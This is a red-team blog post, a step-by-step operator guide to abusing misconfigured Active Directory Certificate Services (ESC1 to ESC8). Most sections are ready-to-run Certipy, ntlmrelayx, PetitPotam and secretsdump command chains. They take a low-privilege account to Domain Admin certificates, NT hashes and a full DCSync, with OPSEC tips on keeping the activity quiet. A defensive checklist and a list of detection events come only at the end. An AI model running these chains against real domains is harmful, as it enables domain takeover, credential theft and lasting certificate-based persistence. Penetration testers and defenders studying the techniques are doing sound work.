---
date: 2026-08-15
categories:
  - Red Team
  - Active Directory
  - Tradecraft
tags:
  - ADCS
  - Active Directory
  - Certipy
  - Kerberos
  - Privilege Escalation
authors:
  - 0x3xp10i73r
description: "A practical operator field guide to Active Directory Certificate Services misconfigurations ESC1 through ESC8, with Certipy one-liners, OPSEC considerations, and detection guidance."
---

# Active Directory Certificate Services (ADCS) ESC1 → ESC8: The Complete Operator Field Guide

![Abstract dark ink texture](../../assets/images/cover-ink.jpg){ .page-cover-img }

**Published:** 2026-08-15 · **Author:** `0x3xp10i73r` · **Category:** Active Directory / Red Team Tradecraft

---

## Why ADCS Is Still the Fastest Path to Domain Admin

In the last two years of internal engagements, the **most common single-hop path to Tier 0** was not a Kerberoastable service account, not a GPP password, and not an unpatched CVE. It was **ADCS**.

The reason is structural: certificates authenticate **without a password**, they often map to **privileged identities**, they survive password changes, and most organisations have never reviewed their template ACLs — because the CA was stood up in 2012 and nobody has touched it since.

This post is my operational field guide: what each ESC is, how to detect it, how to exploit it, what OpSec noise it makes, and how defenders should fix it. Every command is in **Certipy 5.x / PKINITtools / NetExec** form, tested on Windows Server 2016–2025 CAs.

<!-- more -->

---

## 0. Reconnaissance: Find the CAs and Templates First

```bash
# Enumerate all CAs, templates, and flag vulnerable ones
certipy-ad find -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> -vulnerable -stdout
# Save both output formats for later analysis
certipy-ad find -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> -vulnerable \
    -text -json -output adcs_enum
# With a hash instead of a password (OpSec-friendlier: no LDAP password auth)
certipy-ad find -u '<USER>' -hashes :<NTHASH> -dc-ip <DC_IP> -vulnerable
# BloodHound CE: import the Certipy JSON (or collect with the ADCS collector)
# SharpHound.exe -c All,CertServices
# Then query: MATCH p=(n)-[:ADCSESC1|ADCSESC3|ADCSESC4*1..]->(c) RETURN p
```

**What I look for, in priority order:** templates with *Enrollee Supplies Subject* (ESC1), writable templates (ESC4), CA web enrollment exposed (ESC8), and `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6).

---

## 1. ESC1 — Enrollee-Supplied Subject Alternative Name

**The crown jewel.** The template lets the requester specify a SAN (i.e., you can ask for `administrator@corp.local`) and low-privileged users have enroll rights.

```bash
# 1. Confirm the template is actually vulnerable
# Requirements: "Enrollee Supplies Subject: True" + Client Authentication EKU
# + no manager approval + you (or Domain Users) can enroll
certipy-ad find -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> -vulnerable -stdout | \
    grep -A 20 "ESC1"
# 2. Request a certificate as the Domain Administrator
certipy-ad req -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' \
    -upn 'administrator@<DOMAIN>' -sid '<DOMAIN_SID>-500'
# 3. Authenticate with the certificate (PKINIT) -> recover the NT hash
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -username administrator -domain <DOMAIN>
# [+] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:<NTHASH>
# 4. Verify and use it
nxc smb <DC_IP> -u administrator -H <NTHASH> --shares
nxc winrm <DC_HOST> -u administrator -H <NTHASH>
impacket-secretsdump -just-dc -hashes :<NTHASH> '<DOMAIN>/administrator@<DC_IP>'
```

!!! tip "OPSEC: SID + UPN"
    Including `-sid <DOMAIN_SID>-500` produces a cert whose SID extension matches the Domain Admin RID. Without it, some DCs will reject the PKINIT authentication (or your cert maps to the wrong account). Always verify `SID` in the template output before requesting.

---

## 2. ESC2 — Any Purpose / No EKU Restriction

A template with `Any Purpose` EKU or **no EKU at all** can be abused for **client authentication** (and often for code signing on top).

```bash
# If the template allows SAN too, treat it as ESC1:
certipy-ad req -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -template '<ANY_PURPOSE_TEMPLATE>' -upn 'administrator@<DOMAIN>'
# If it's a subordinate CA template (ESC2 variant), you can sign your own certs:
# Require enrollment -> forge ANY certificate
certipy-ad req -ca '<CA_NAME>' -template 'SubCA' ... # then use the sub CA to sign
```

---

## 3. ESC3 — Enrollment Agent Abuse

An "Enrollment Agent" template allows requesting certificates **on behalf of another user**. That is a *feature* — and a catastrophic one if a low-priv account has it.

```bash
# 1. Get an enrollment agent certificate for yourself
certipy-ad req -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -template 'EnrollmentAgent'
# 2. Use it to request a certificate ON BEHALF OF the Domain Administrator
certipy-ad req -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -template 'User' \
    -on-behalf-of '<DOMAIN>\administrator' -pfx agent.pfx
# 3. Authenticate as DA
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## 4. ESC4 — Writable Template (ACL Abuse)

Here **you** have `GenericAll`/`GenericWrite`/`WriteDACL` on the template object. Overwrite its configuration to remove restrictions (make it ESC1), request your DA cert, then **restore the original configuration**.

```bash
# 1. Make the template vulnerable (Enrollee Supplies Subject = True, Client Auth EKU)
certipy-ad template -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -template '<WRITABLE_TEMPLATE>' -write-default-configuration
# 2. Exploit as ESC1
certipy-ad req -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -template '<WRITABLE_TEMPLATE>' -upn 'administrator@<DOMAIN>'
# 3. RESTORE the template (critical for client hygiene!)
certipy-ad template -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -template '<WRITABLE_TEMPLATE>' -write-configuration ./original_template.json
```

!!! danger "Always Restore"
    Modifying a template triggers **event 4899 / 4900** and directory-replication alerts in mature SOCs. Restore the original JSON immediately after exploitation, and flag the action in your report as a detected-if-monitored activity.

---

## 5. ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA

If the CA itself has this flag, **any** template (even one that normally doesn't allow SANs) will accept a SAN you supply.

```bash
# 1. Check the flag
certipy-ad find ... | grep -i "User Specified SAN"
# Or directly:
certutil -config "<CA_HOST>\<CA_NAME>" -getreg policy\EditFlags
# 2. Request using any client-auth template and add your own SAN
certipy-ad req -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -template 'User' -upn 'administrator@<DOMAIN>'
# 3. (Mitigation bypass note) Modern Windows requires the SID to match the SAN for
# PKINIT unless "strong certificate binding" is off — test both:
certipy-ad req ... -upn 'administrator@<DOMAIN>' -sid '<DOMAIN_SID>-500'
```

---

## 6. ESC7 — ManageCA / ManageCertificates Rights

If your account has `ManageCA` (CA officer) or `ManageCertificates`, you can **approve your own rejected requests** — including ones requesting a DA certificate.

```bash
# 1. Confirm the rights
certipy-ad find ... | grep -i "ManageCA\|ManageCertificates"
# 2. Add yourself as an officer (if you have ManageCA)
certipy-ad ca -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -add-officer '<USER>'
# 3. Enable the "SubCA" template and issue a request directly (requires approval)
certipy-ad ca -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -enable-template SubCA

certipy-ad req -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -template SubCA -upn 'administrator@<DOMAIN>'
# Note the failed Request ID
# 4. Approve your own request and retrieve the certificate
certipy-ad ca -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -issue-request <REQUEST_ID>
certipy-ad req -u '<USER>@<DOMAIN>' -p 'Password123!' -dc-ip <DC_IP> \
    -ca '<CA_NAME>' -retrieve <REQUEST_ID>
```

!!! warning "ESC7 = PKI Takeover"
    `ManageCA` is effectively **full PKI control**. Combined with `SubCA`, you can forge certificates that survive password resets — a persistence mechanism, not just an escalation.

---

## 7. ESC8 — NTLM Relay to the ADCS HTTP Enrollment Endpoint

The most reliably exploited **unauthenticated → domain admin** chain in internal engagements. Requires: the CA has the **Web Enrollment role** (`/certsrv/`) and LDAP/SMB relay to a DC machine account is viable.

```bash
# 1. Confirm Web Enrollment is live and vulnerable (NTLM, no EPA/HTTPS)
curl -I http://<CA_IP>/certsrv/certfnsh.asp
# 2. Start the relay, targeting the ADCS HTTP endpoint with the DomainController template
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support \
    --adcs --template DomainController -of adcs_certs
# 3. Coerce a Domain Controller to authenticate to you
python3 PetitPotam.py -u '<USER>' -p 'Password123!' -d <DOMAIN> <LHOST> <DC_IP>
# Alternatives: Coercer (more primitives), PrinterBug (MS-RPRN), DFSCoerce, ShadowCoerce
# 4. Use the harvested DC certificate -> DC machine account NT hash
certipy-ad auth -pfx '<DC_SHORTNAME>$.pfx' -dc-ip <DC_IP> -username '<DC_SHORTNAME>$' -domain <DOMAIN>
# 5. DCSync as the DC machine account
impacket-secretsdump -just-dc '<DOMAIN>/<DC_SHORTNAME>$'@<DC_IP> -hashes :<DC_MACHINE_NTHASH>
```

**Why this works:** a DC's machine account can request a certificate that allows PKINIT, and the DC machine account has **DCSync-equivalent replication rights by default** (it's a DC!). No password cracking required.

```bash
# --- Alternative ESC8 targets when the CA itself is not reachable ---
# Relay to LDAP(S) instead to grant yourself DCSync:
impacket-ntlmrelayx -t ldaps://<DC_IP> -smb2support --escalate-user '<USER>'
# Or relay to a CA that trusts a different enrollment endpoint (NDES / CES / CEP)
```

---

## 8. Certificate → Credential: The PKINIT Workflow in Depth

```bash
# --- Via Certipy (also supports UnPAC-the-hash) ---
certipy-ad auth -pfx user.pfx -dc-ip <DC_IP> -username '<USER>' -domain <DOMAIN>
# -> outputs NT hash + TGT (ccache)
# --- Via PKINITtools (gettgtpkinit + getnthash) ---
python3 gettgtpkinit.py -cert-pfx user.pfx -dc-ip <DC_IP> <DOMAIN>/<USER> user.ccache
export KRB5CCNAME=user.ccache
python3 getnthash.py -key <AS_REP_KEY> <DOMAIN>/<USER>
# --- Use the TGT for further access ---
nxc smb <DC_IP> -k --use-kcache --shares
impacket-secretsdump -k -no-pass -just-dc <DC_HOST>.<DOMAIN>
# --- IMPORTANT: certificates are useful even after a password reset ---
# Mitigation: revoke the certificate on the CA, or rotate the CA, or map by SID only.
certipy-ad ca -u '<USER>' -p 'Pass' -ca '<CA_NAME>' -revoke <SERIAL> # (that's the blue team's job)
```

---

## 9. Defensive Checklist (Copy This Into Your Report)

- [ ] Audit **all** templates: remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unless truly required
- [ ] Remove `Any Purpose` and "no EKU" templates; enforce Client Authentication only where needed
- [ ] Lock down template ACLs (no `GenericAll`/`WriteDACL` for non-PKI admins)
- [ ] Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA
- [ ] Remove the **Web Enrollment** role entirely where possible; otherwise enable **HTTPS + EPA + require TLS**, and disable NTLM on the CA
- [ ] Enforce **Strong Certificate Binding** (`StrongCertificateBindingEnforcement = 2`) and enable **SID security extension**
- [ ] Restrict enrollment rights via **Issuance Policies** and require **manager approval** for sensitive templates
- [ ] Monitor for: certificate requests with mismatched SANs, template modifications, officer approvals, PKINIT authentication from unusual hosts, and huge volumes of Kerberos traffic from a single source

```text
Key detection signals:
  Event 4886 / 4887 : certificate services approved/issued
  Event 4768 : Kerberos TGT request with PKINIT pre-auth (certificate logon)
  Security event 4899/4900 : template / CA configuration modification
  Sysmon 3 + LDAP : unusual ldap:// request to modify msPKI-* attributes
  Network : NTLM authentication to the CA's /certsrv/ endpoint from a server
```

!!! tip "Final Advice for Operators"
    Map ADCS **first** — before Kerberoasting, before spraying. It is deterministic, fast, quiet when done correctly, and requires no cracking. And always restore what you modify.